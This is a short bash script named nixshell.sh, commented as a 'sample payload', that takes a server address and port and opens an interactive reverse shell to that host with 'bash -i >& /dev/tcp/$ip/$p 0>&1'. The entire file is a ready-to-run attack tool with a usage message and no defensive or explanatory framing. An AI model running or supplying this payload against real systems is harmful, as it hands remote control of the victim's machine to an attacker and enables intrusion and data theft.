#!/bin/bash
# sample payload

if [ $# != 2 ]; then
    printf "\n\\t\e[1;41mUsage: ./nixshell.sh <server_address> <server_port>\e[0m\n"
    printf "\n\t\e[1;41mExample: ./nixshell.sh 127.0.0.1 8011\e[0m\n\n"
    exit 1
fi

ip=$1
p=$2


bash -i >& /dev/tcp/$ip/$p 0>&1
